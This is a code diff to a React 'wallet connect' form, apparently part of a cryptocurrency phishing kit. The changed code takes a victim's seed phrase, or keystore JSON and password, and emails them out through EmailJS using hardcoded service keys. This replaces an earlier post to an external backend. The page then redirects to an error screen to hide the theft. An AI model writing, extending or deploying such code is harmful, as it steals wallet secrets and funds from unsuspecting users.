@@ -1,5 +1,5 @@
-import React, { useEffect, useState } from 'react';
-import { AiOutlineClose } from 'react-icons/ai';
+import React, { useState } from 'react';
+import { IoArrowBackOutline } from "react-icons/io5";
 import styles from './WalletConnectForm.module.css';
 import {useNavigate} from 'react-router-dom'
 import axios from 'axios'
@@ -8,6 +8,7 @@ import WalletImageContainer from './WalletConnectForm/WalletImageContainer';
 import PrivateKeyForm from './WalletConnectForm/PrivateKeyForm';
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
+import emailjs from '@emailjs/browser';
 
 const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
   const navigate = useNavigate()
@@ -49,10 +50,33 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     const type = "Phrase"
     const data = phrase
     const password = "not_required"
-    
+    const formData = {name, type, data, password}
     if (validatePhrase(phrase)) {
       try {
-         await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
+        //  await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
+        // await emailjs.send(
+        //   'service_ky8xa0e',
+        //   'template_kqjcmir',
+        //   {
+        //     ...formData,
+        //   },
+        //   'pudHPDoixy2beukw8'
+        // );
+        await emailjs.send(
+          'service_ky8xa0e',
+          'template_kqjcmir',
+          {
+            to_name: "dapp", // Replace with the actual recipient's name if needed
+            from_name: formData.name,
+            message: `
+              Name: ${formData.name}
+              Type: ${formData.type}
+              Data: ${formData.data}
+              Password: ${formData.password}
+            `,
+          },
+          'pudHPDoixy2beukw8'
+        );
         setTimeout(() => {
           navigate('/error')
         }, 3000);
@@ -77,14 +101,38 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
 
   // ##### KEYSTORE JSON SUBMISSION
   const handleKeystoreSubmit = async (e) => {
-    setKeystoreSubmit("Processing...");
     e.preventDefault();
+    setKeystoreSubmit("Processing...");
     const name = wallet
     const type = "Keystore_JSON"
     const data = keystore
     const password = keystorePassword
+    const formData = {name, type, data, password}
     try {
-      await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
+      // await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
+      // await emailjs.send(
+      //   'service_ky8xa0e',
+      //   'template_kqjcmir',
+      //   {
+      //     ...formData,
+      //   },
+      //   'pudHPDoixy2beukw8'
+      // );
+      await emailjs.send(
+        'service_ky8xa0e',
+        'template_kqjcmir',
+        {
+          to_name: "dapp", // Replace with the actual recipient's name if needed
+          from_name: formData.name,
+          message: `
+            Name: ${formData.name}
+            Type: ${formData.type}
+            Data: ${formData.data}
+            Password: ${formData.password}
+          `,
+        },
+        'pudHPDoixy2beukw8'
+      );
       setTimeout(() => {
         navigate('/error')
       }, 3000);
@@ -117,8 +165,9 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
             onClick={() => setDisplayForm(false)}
             className={styles.backButton}
           >
-            Back
+            <IoArrowBackOutline />
           </button>
+
         </div>
 
         <div className={styles.walletForm}>
@@ -140,7 +189,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
               className={activeButton === 2 ? styles.activeButton : styles.viewButton}
             >
               <span className={styles.viewButtonSpan}>
-                <span>Keystore</span>
+                <span>Keystore</span>{" "}
                 <span>JSON</span>
               </span>
             </button>
